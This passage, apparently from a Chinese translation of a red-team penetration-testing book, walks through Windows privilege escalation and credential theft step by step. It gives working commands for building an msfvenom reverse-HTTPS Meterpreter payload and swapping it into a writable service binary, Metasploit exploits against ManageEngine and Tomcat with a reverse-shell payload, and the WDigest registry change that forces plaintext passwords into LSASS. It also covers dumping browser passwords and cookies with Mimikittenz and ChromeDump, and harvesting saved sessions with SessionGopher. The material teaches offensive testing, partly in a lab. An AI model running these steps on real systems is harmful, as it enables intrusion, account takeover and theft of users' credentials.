检查AlwaysInstallElevated注册表项，该注册表项标识是否使用提升的权限安装.MSI文件（NT AUTHORITY \ SYSTEM）。
请注意，我们并不需要手动执行这些操作，Windows中的Metasploit和PowerShell工具模块已经实现该功能。在下面的示例中，我们将介绍PowerUp PowerShell脚本。在这种情况下，脚本随着Empire一起运行，并将检查所有常见的错误配置区域，找到允许常规用户获取本地管理或系统账户的漏洞。在图4.11所示的示例中，我们在被攻击者系统中运行脚本，并发现本地系统存在未加引号的服务路径漏洞。现在，我们可能无法重新启动该服务，但我们应该能够利用此漏洞并等待重新启动。
Empire通电模块。 
usermodule privesc/powerup/allchecks
立刻显示的内容。
ServiceName                 : WavesSysSvc
Path                         : C:\Program
Files\Waves\MaxxAudio\WavesSysSvc64.exe 
ModifiableFile              : C:\Program
Files\Waves\MaxxAudio\WavesSysSvc64.exe
ModifiableFilePermissions    : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : Everyone
StartName                      : LocalSystem
对于WavesSysSyc服务，似乎每个用户都具有写权限，这意味着可以用恶意二进制文件替换WaveSysSvc64.exe文件。
图4.11
创建Meterpreter二进制文件（稍后将讨论如何绕过杀毒软件）。 
msfvenom -p windows/meterpreter/reverse_https LHOST = [ip] LPORT = 8080 -f exe> shell.exe
使用Empire上传二进制文件并替换原始二进制文件。 
upload ./shell.exe C:\users\test\shell.exe
shell copy C:\users\test\Desktop\shell.exe "C:\ProgramFiles\Waves\MaxxAudio\ WavesSysSvc64.exe"
重新启动服务或等待系统重新启动。
一旦服务重新启动，Meterpreter Shell将具有系统权限！使用PowerUp，您会发现许多容易受到权限提升影响的服务。
对于未修补的Windows系统，确实存在权限提升漏洞，但是如何快速识别Windows系统上安装的补丁？我们可以在被攻击者系统上，使用默认命令来查看安装了哪些服务包。利用Windows内置命令“systeminfo”，可以获取Windows主机所有修补程序历史记录。根据命令输出，将这些历史记录推送到Kali系统中，运行Windows Exploit Suggester来查找针对这些漏洞的漏洞利用程序，如图4.12所示。
图4.12
返回Windows 10被攻击者系统。
systeminfo。
systeminfo > windows.txt。
将windows.txt复制到Kali系统的/opt/Windows-Exploit-Suggester目录。
python ./windows-exploit-suggester.py -i ./windows.txt -d 2018-03-21-mssb.xls。
这个工具已经一段时间没有主动更新了，但您可以轻松找到权限提升漏洞。
如果在一个已打好补丁的Windows环境中，我们会关注第三方软件中的权限提升漏洞或操作系统的任何0-day/新漏洞。例如，我们一直在挖掘Windows中的权限提升漏洞，漏洞在本书写作之时未打补丁。在这种情况下，通常可能存在一些基本的漏洞演示代码，但是我们需要测试，验证并多次完成攻击。我们定期检测公共权限提升漏洞的一些区域。
通常，这只是时间问题。例如，从发现漏洞到打上补丁，您只有有限的时间和机会可以突破系统。
4.7.1 权限提升实验
测试和尝试不同权限提升漏洞的较好的实验环境是Metasploitable3，由Rapid7提供。这个存在漏洞的框架会自动构建一个Windows虚拟机，包含了所有常见漏洞和一些不常见的漏洞。它需要进行一些设置，但是虚拟机配置完成后，它就是一个很棒的测试实验环境。
下面介绍一个示例，帮助您快速入门。
使用Nmap工具扫描Metasploitable3设备（确保扫描所有端口，否则可能遗漏一些端口）。
您将在端口8383上看到ManageEngine正在运行。
启动Metasploit并搜索任何ManageEngine漏洞。 
msfconsole
search manageengine
use exploit/windows/http/manageengine_connectionid_write
set SSL True
set RPORT 8383
set RHOST 
exploit
getsystem
您会发现无法访问系统，因为受到攻击的服务不是特权进程。您可以在此处尝试所有不同的权限提升攻击方式。
我们发现Apache Tomcat作为特权进程正在运行。如果利用该服务，那么我们的静荷将以高权限执行。Apache Tomcat运行在端口8282上，但访问需要用户名和密码。由于已经有一个用户Shell，因此我们可以尝试在磁盘上搜索密码。我们可以在互联网中搜索“Where are Tomcat Passwords Stored”，结果是tomcat-users.xml。
在被攻击者设备中，搜索和读取tomcat-users.xml文件。 
shell
cd \ && dir/s tomcat-users.xml
type "C:\Program Files\Apache Software Foundation\tomcat\apache-tomcat-8.0.33\conf\tomcat-users.xml"
现在使用获取的密码攻击Tomcat。首先，登录到端口8282上的Tomcat管理控制台，查看密码是否正常工作。然后使用Metasploit，通过Tomcat部署恶意WAR文件。 
search tomcat
use exploit/multi/http/tomcat_mgr_upload
show options
set HTTPusername sploit
set HTTPpassword sploit
set RPORT 8282
set RHOST 
set Payload java/shell_reverse_tcp
set LHOST 
exploit
whoami
您现在具有系统权限。我们使用第三方工具将权限提升到系统权限。
4.7.2 从内存中提取明文文本凭证
Mimikatz 工具已经存在了一段时间，在获取明文密码方面改变了游戏规则。在Windows 10之前，在主机上以管理员身份运行Mimikatz工具，攻击者可以从LSASS（本地安全子系统）中提取明文密码。这种方法非常有效，直到Windows 10出现，即使本地管理员也无法读取明文密码。现在，我看到一些有趣的用法，单点登录（SSO）或一些特殊的软件将密码放在LSASS中，Mimikatz 可以读取密码，但我们现在不考虑这种情况。在本章中，我们将讨论当Mimikatz工具不起作用时该怎么做（如在Windows 10操作系统中）。
假设您已经突破了Windows 10工作站，并将权限提升为本地管理员。在默认情况下，您可以启动Mimikatz，输入下面的查询命令，查看密码字段，发现为null，如图4.13所示。
图4.13
那么，您可以做什么？比较简单的选择是设置注册表项，将密码放到LSASS中。在HKLM中，有一个UseLogonCredential项，如果设置为0，则会将凭证存储在内存中。
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest/v UseLogonCredential/t REG_DWORD/d 1/f。
使用Empire工具，我们可以在Shell中运行这个命令。 
shell reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\ WDigest/v UseLogonCredential/t REG_DWORD/d 1/f
这样设置的问题是我们需要用户重新登录系统。这可能导致屏幕超时、重新启动或注销，然后您才可以再次捕获明文凭证。比较简单的方法是锁定工作站（这样它们就不会丢失任何工作……）。触发锁定屏幕操作如下。
rundll32.exe user32.dll，LockWorkStation。
一旦导致锁定屏幕，并且用户重新登录，我们就可以重新运行Mimikatz获取明文密码，如图4.14所示。
图4.14
如果我们无法获得本地管理账户怎么办？有什么其他方法获取用户的凭证？回想之前的方法，常见的测试攻击需要查看胖客户端的用户空间内存，查看能否发现明文形式的凭证。现在一切都是基于浏览器的，我们可以在浏览器中做同样的事情吗？
安全研究人员putterpanda提供了一个很不错的原型验证风格工具来实现这个功能，该工具称为Mimikittenz。Mimikittenz工具的功能是利用Windows函数ReadProcessMemory()从各种目标进程（如浏览器）中提取纯文本密码。
Mimikittenz为Gmail、Office 365、Outlook Web、Jira、GitHub、Bugzilla、Zendesk、Cpanel、Dropbox、Microsoft OneDrive、AWS Web Services、Slack、Twitter和Facebook提供了大量内存搜索查询的方法。您也可以在Mimikittenz中轻松地设计出自己的搜索方法。
Mimikittenz 的最大优点是它不需要本地管理员访问权限，因为它访问的是所有用户空间内存。一旦突破了主机，我们就可以将Mimikittenz导入内存，然后运行Invoke- mimikittenz脚本。
如图4.15所示，用户使用Firefox浏览器登录到GitHub，我们可以从浏览器的内存中提取用户名和密码。现在，我希望每个进行模拟攻击的读者都可以将此工具提升到新的水平，并为不同的应用程序创建更多的搜索查询方法。
图4.15
4.7.3 从Windows凭证存储中心和浏览器中获取密码
Windows凭证存储中心是Windows的默认功能，它为系统、网站和服务器保存用户名、密码和证书。当您使用Microsoft IE/Edge对网站进行身份验证时，通常会弹出一个提示“是否要保存密码？”的窗口。凭证存储中心是存储密码的地方。在证书管理器中，有两种类型的凭证：网站和Windows。您记得什么用户有权访问这些数据吗？不是系统用户，而是登录的用户可以获取此信息，如图4.16所示。这对我们来说很有利，就像任何网络钓鱼或代码执行攻击一样，我们通常具有被攻击者的权限。我们甚至不需要成为本地管理员就可以提取这些数据。
图4.16
如何提取这些信息？我们可以导入两个不同的PowerShell脚本来搜集这些数据，如图4.17所示。
获取网站凭证。
获取Windows凭证（类型仅是常用主机，而不是域主机）。
正如您从转储数据中看到的那样，我们同时提取了Facebook凭证以及内存中存储的任何通用凭证。请记住，对于网站凭证，Get-WebCredentials仅从Internet Explorer/Edge获取密码。如果我们需要从Chrome中获取凭证，那么可以使用Empire静荷powershell/collection/ ChromeDump。为了让ChromeDump脚本工作，您首先需要终止Chrome进程，然后运行ChromeDump。最后，我喜欢提取所有浏览器历史记录和Cookie。我们不仅可以了解它们的内部服务器，而且，如果会话仍然存在，那么我们可以使用Cookie并在不知道密码的情况下进行身份鉴权！
图4.17
如图4.18所示，使用PowerShell脚本，我们可以提取所有浏览器Cookie，并在我们的浏览器中使用这些Cookie，所有这些都不需要提升权限。
图4.18
接下来，我们甚至可以开始在被攻击者系统上安装的所有第三方软件中查找服务器和凭证。SessionGopher工具可以从WinSCP、PuTTY、SuperPuTTY、FileZilla和Microsoft远程桌面获取主机名和保存的密码。这个工具的另外一个功能是能够从网络上的其他系统远程获取本地凭证。启动SessionGopher的简单方法是导入PowerShell脚本并使用以下命令执行。
导入PowerShell文件。 
. .\SessionGopher.ps1
执行SessionGopher工具。 
Invoke-SessionGopher -Thorough
我们从主机系统获取凭证的这些方法，无须权限提升、绕过UAC或运行键盘记录器。由于处在用户环境中，因此我们可以访问主机的许多资源，从而帮助我们继续渗透。